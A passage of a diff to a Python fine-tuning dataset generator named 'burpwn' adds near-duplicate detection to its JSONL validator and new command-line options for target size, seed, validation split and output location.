                 n_cli += 1
             elif rec.get("style") == "mcp":
                 n_mcp += 1
+            k = _normalized_key(rec)
+            if k in keys:
+                dupes += 1
+                problems.append(
+                    f"line {idx}: near-duplicate of line {keys[k]} (normalized content)"
+                )
+            else:
+                keys[k] = idx
 
     total = n_cli + n_mcp
     if problems:
@@ -1362,34 +3263,78 @@ def run_validate(path: str) -> int:
             print(p, file=sys.stderr)
         print(
             f"FAIL: {len(problems)} problem(s) in {src} "
-            f"({total} valid records: {n_cli} cli, {n_mcp} mcp)",
+            f"({total} records: {n_cli} cli, {n_mcp} mcp, {dupes} dupes)",
             file=sys.stderr,
         )
         return 1
     print(
-        f"OK: {src} — {total} valid records ({n_cli} cli, {n_mcp} mcp), "
+        f"OK: {src} — {total} records ({n_cli} cli, {n_mcp} mcp), 0 dupes, "
         f"schema {SCHEMA_VERSION}",
         file=sys.stderr,
     )
     return 0
 
 
+# --------------------------------------------------------------------------- #
+# CLI.
+# --------------------------------------------------------------------------- #
+
+DEFAULT_SEED = 1337
+HERE = os.path.dirname(os.path.abspath(__file__))
+
+
 def main(argv: list[str]) -> int:
-    ap = argparse.ArgumentParser(description=__doc__)
+    ap = argparse.ArgumentParser(description="burpwn fine-tuning dataset generator")
     ap.add_argument(
-        "--validate",
-        nargs="?",
-        const="dataset.jsonl",
-        metavar="PATH",
-        help="validate the given JSONL file (default ./dataset.jsonl, '-' = stdin) "
-        "instead of generating",
+        "--validate", nargs="?", const="dataset.jsonl", metavar="PATH",
+        help="validate a JSONL file (default ./dataset.jsonl, '-'=stdin) instead of generating",
+    )
+    ap.add_argument(
+        "--target", type=int, default=None, metavar="N",
+        help="aim for ~N examples (deterministic, style-balanced subsample; never pads "
+        "beyond the families' ceiling)",
+    )
+    ap.add_argument("--seed", type=int, default=DEFAULT_SEED, help="reproducible RNG seed")
+    ap.add_argument(
+        "--val-frac", type=float, default=0.05, help="validation split fraction (default 0.05)"
+    )
+    ap.add_argument(
+        "--stdout", action="store_true",
+        help="emit the combined dataset to stdout instead of writing files",
+    )
+    ap.add_argument(
+        "--outdir", default=HERE, help="directory to write dataset files into (default: script dir)"
     )
     args = ap.parse_args(argv)
 
     if args.validate is not None:
         return run_validate(args.validate)
 
-    emit(all_records())
+    records = build_dataset(args.target, args.seed)
+    train, val = split_dataset(records, args.seed, args.val_frac)
+    # Combined file uses the same stable order as the splits concatenated:
+    combined = sorted(records, key=_normalized_key)
+
+    if args.stdout:
+        emit(combined, sys.stdout)
+        return 0
+
+    paths = {
+        "dataset.jsonl": combined,
+        "dataset.train.jsonl": train,
+        "dataset.validation.jsonl": val,
+    }
+    for fname, recs in paths.items():
+        with open(os.path.join(args.outdir, fname), "w", encoding="utf-8") as fh:
+            emit(recs, fh)
+    n_cli = sum(1 for r in combined if r["style"] == "cli")
+    n_mcp = sum(1 for r in combined if r["style"] == "mcp")
+    print(
+        f"wrote {len(combined)} records ({n_cli} cli, {n_mcp} mcp) → "
+        f"dataset.jsonl; train={len(train)} validation={len(val)} "
+        f"(seed={args.seed})",
+        file=sys.stderr,
+    )
     return 0
 
 
